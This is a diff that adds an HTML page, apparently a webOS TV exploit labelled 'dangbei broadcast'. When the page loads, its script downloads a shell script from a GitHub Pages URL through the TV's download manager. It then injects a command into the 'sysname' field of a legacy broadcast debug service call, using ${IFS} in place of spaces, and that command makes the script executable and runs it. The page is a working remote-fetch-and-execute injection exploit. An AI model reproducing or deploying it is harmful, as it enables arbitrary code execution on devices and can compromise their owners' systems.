@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>dangbei broadcast</title>
+  <style>
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      color: #f5f1e8;
+      overflow: hidden;
+      font-family: sans-serif;
+    }
+
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .status-card {
+      min-width: 320px;
+      max-width: 80vw;
+      padding: 24px 28px;
+      border: 1px solid #3a3a3a;
+      border-radius: 12px;
+      background: #111;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      text-align: center;
+    }
+
+    .status-label {
+      margin: 0 0 10px;
+      font-size: 14px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #9d9d9d;
+    }
+
+    .status-value {
+      margin: 0;
+      font-size: 34px;
+      font-weight: 700;
+    }
+
+    .status-value.pending {
+      color: #f4c95d;
+    }
+
+    .status-value.success {
+      color: #64d98b;
+    }
+
+    .status-value.failed {
+      color: #ff7878;
+    }
+
+    .status-detail {
+      margin: 14px 0 0;
+      font-size: 15px;
+      color: #c8c8c8;
+      word-break: break-word;
+    }
+
+    .status-note {
+      margin: 12px 0 0;
+      font-size: 13px;
+      color: #8d8d8d;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+  <main class="status-card">
+    <p class="status-label">Dangbei Broadcast</p>
+    <p id="statusValue" class="status-value pending">pending</p>
+    <p id="statusDetail" class="status-detail">starting download...</p>
+    <p id="statusNote" class="status-note"></p>
+  </main>
+  <script>
+    var statusValueEl = document.getElementById('statusValue');
+    var statusDetailEl = document.getElementById('statusDetail');
+    var statusNoteEl = document.getElementById('statusNote');
+    var activeTicket = null;
+    var statusSubscriptionStarted = false;
+    var broadcastSent = false;
+
+    function setStatus(state, detail, note) {
+      statusValueEl.textContent = state;
+      statusValueEl.className = 'status-value ' + state;
+      statusDetailEl.textContent = detail || '';
+      statusNoteEl.textContent = note || '';
+    }
+
+    function errorMessage(error, fallback) {
+      if (!error) {
+        return fallback || 'unexpected error';
+      }
+      if (typeof error === 'string') {
+        return error || fallback || 'unexpected error';
+      }
+      if (error.message) {
+        return error.message;
+      }
+      return fallback || String(error);
+    }
+
+    function payloadSummary(payload) {
+      if (!payload) {
+        return '';
+      }
+      var parts = [];
+      if (payload.errorText) parts.push(payload.errorText);
+      if (typeof payload.httpStatus !== 'undefined') parts.push('HTTP ' + payload.httpStatus);
+      if (typeof payload.completionStatusCode !== 'undefined') parts.push('code ' + payload.completionStatusCode);
+      if (payload.state) parts.push('state ' + payload.state);
+      if (payload.target) parts.push(payload.target);
+      if (payload.url) parts.push(payload.url);
+      if (payload.ticket) parts.push('ticket ' + payload.ticket);
+      if (!parts.length) {
+        try {
+          return JSON.stringify(payload);
+        } catch (_) {
+          return String(payload);
+        }
+      }
+      return parts.join(' | ');
+    }
+
+    function detailFromPayload(payload, fallback) {
+      if (!payload) {
+        return fallback || 'no payload';
+      }
+      if (payload.errorText) {
+        return payload.errorText;
+      }
+      if (payload.target) {
+        return payload.target;
+      }
+      if (payload.state) {
+        return payload.state;
+      }
+      if (payload.ticket) {
+        return 'ticket ' + payload.ticket;
+      }
+      return JSON.stringify(payload);
+    }
+
+    function downloadFailureDetail(payload) {
+      if (!payload) {
+        return 'download failed';
+      }
+      if (payload.errorText) {
+        return payload.errorText;
+      }
+      if (payload.aborted === true) {
+        return 'download was aborted';
+      }
+      if (payload.interrupted === true) {
+        return 'download was interrupted';
+      }
+      if (typeof payload.httpStatus !== 'undefined') {
+        return 'download failed (HTTP ' + payload.httpStatus + ')';
+      }
+      if (typeof payload.completionStatusCode !== 'undefined') {
+        return 'download failed (code ' + payload.completionStatusCode + ')';
+      }
+      return 'download failed';
+    }
+
+    function getScriptPath() {
+      return '/media/internal/downloads/ts.sh';
+    }
+
+    function buildTriggerCommand(scriptPath) {
+      return 'chmod${IFS}+x${IFS}' + scriptPath + ';' + scriptPath;
+    }
+
+    function buildLegacyBroadcastPayload(command) {
+      return {
+        menu: 'ci',
+        data: "ciplus20: sub=/ cmd=unbind sysname=';" + command + ";#'"
+      };
+    }
+
+    function parsePayload(payload) {
+      if (typeof payload !== 'string') {
+        return payload;
+      }
+      try {
+        return JSON.parse(payload);
+      } catch (_) {
+        return payload;
+      }
+    }
+
+    function isSuccessfulDownloadStatus(status) {
+      return !!(
+        status &&
+        status.returnValue === true &&
+        status.completed === true &&
+        status.aborted !== true &&
+        status.interrupted !== true &&
+        status.state === 'completed' &&
+        status.httpStatus === 200
+      );
+    }
+
+    function isFailedDownloadStatus(status) {
+      if (!status || status.returnValue !== true) {
+        return !!status;
+      }
+      return (
+        status.aborted === true ||
+        status.interrupted === true ||
+        status.completed === false && (
+          status.completionStatusCode < 0 ||
+          status.errorCode ||
+          status.errorText
+        )
+      );
+    }
+
+    function callLegacyBroadcast() {
+      if (broadcastSent) {
+        return;
+      }
+      broadcastSent = true;
+      try {
+        var command = buildTriggerCommand(getScriptPath());
+        var triggerPayload = buildLegacyBroadcastPayload(command);
+        var triggerBridge = new window.PalmServiceBridge();
+        triggerBridge.onservicecallback = function (payload) {
+          var parsed = parsePayload(payload);
+          if (parsed && parsed.returnValue === false) {
+            setStatus('failed', 'broadcast call failed', payloadSummary(parsed));
+          }
+        };
+        setStatus(
+          'pending',
+          'download complete, sending broadcast call...',
+          'Watch for a success toast on the TV after the call is sent.'
+        );
+        triggerBridge.call(
+          'luna://com.webos.service.legacybroadcast.debug/menu',
+          JSON.stringify(triggerPayload)
+        );
+        setStatus(
+          'success',
+          'broadcast call sent',
+          'Watch for a success toast on the TV.'
+        );
+      } catch (error) {
+        setStatus('failed', 'broadcast call failed', errorMessage(error, 'broadcast call failed'));
+      }
+    }
+
+    function subscribeToDownloadStatus(ticket) {
+      if (!ticket) {
+        return;
+      }
+      if (statusSubscriptionStarted && activeTicket === ticket) {
+        return;
+      }
+      activeTicket = ticket;
+      statusSubscriptionStarted = true;
+      try {
+        var statusBridge = new window.PalmServiceBridge();
+        var settled = false;
+        statusBridge.onservicecallback = function (payload) {
+          var parsed = parsePayload(payload);
+          if (!parsed || parsed.returnValue === false) {
+            settled = true;
+            setStatus('failed', 'download status query failed', payloadSummary(parsed));
+            return;
+          }
+          if (settled) {
+            return;
+          }
+          if (isSuccessfulDownloadStatus(parsed)) {
+            settled = true;
+            setStatus('pending', 'download completed', parsed.target || '');
+            callLegacyBroadcast();
+            return;
+          }
+          if (isFailedDownloadStatus(parsed)) {
+            settled = true;
+            setStatus('failed', downloadFailureDetail(parsed), payloadSummary(parsed));
+            return;
+          }
+          setStatus('pending', 'downloading...', parsed.target || parsed.state || '');
+        };
+        var statusPayload = {
+          ticket: ticket,
+          subscribe: true
+        };
+        statusBridge.call(
+          'luna://com.webos.service.downloadmanager/downloadStatusQuery',
+          JSON.stringify(statusPayload)
+        );
+      } catch (error) {
+        setStatus('failed', 'download status query failed', errorMessage(error, 'download status query failed'));
+      }
+    }
+
+    function runDangbeiBroadcast() {
+      if (typeof window.PalmServiceBridge === 'undefined') {
+        setStatus('failed', 'PalmServiceBridge is not available');
+        return;
+      }
+
+      try {
+        var bridge = new window.PalmServiceBridge();
+        var requestAccepted = false;
+        bridge.onservicecallback = function (payload) {
+          var parsed = parsePayload(payload);
+          if (!parsed) {
+            setStatus('failed', 'download request returned an empty payload');
+            return;
+          }
+          if (parsed.ticket) {
+            requestAccepted = true;
+            setStatus('pending', 'download accepted', detailFromPayload(parsed, 'waiting for download status'));
+            if (!statusSubscriptionStarted || activeTicket !== parsed.ticket) {
+              subscribeToDownloadStatus(parsed.ticket);
+            }
+            return;
+          }
+          if (parsed.returnValue === false) {
+            setStatus('failed', 'download request rejected', payloadSummary(parsed));
+            return;
+          }
+          if (!requestAccepted) {
+            setStatus('pending', 'waiting for ticket...', payloadSummary(parsed));
+          } else if (parsed.completed === true || parsed.state || parsed.amountReceived || parsed.amountTotal) {
+            setStatus('pending', 'download in progress...', payloadSummary(parsed));
+          }
+        };
+        var requestPayload = {
+          target: 'https://azoffshowy.github.io/ssap-install-bridge/resources/ts.sh',
+          targetDir: '/media/internal/downloads',
+          targetFilename: 'ts.sh',
+          subscribe: false
+        };
+        bridge.call(
+          'luna://com.webos.service.downloadmanager/download',
+          JSON.stringify(requestPayload)
+        );
+      } catch (error) {
+        setStatus('failed', 'download request failed', errorMessage(error, 'download request failed'));
+      }
+    }
+
+    runDangbeiBroadcast();
+  </script>
+</body>
+</html>
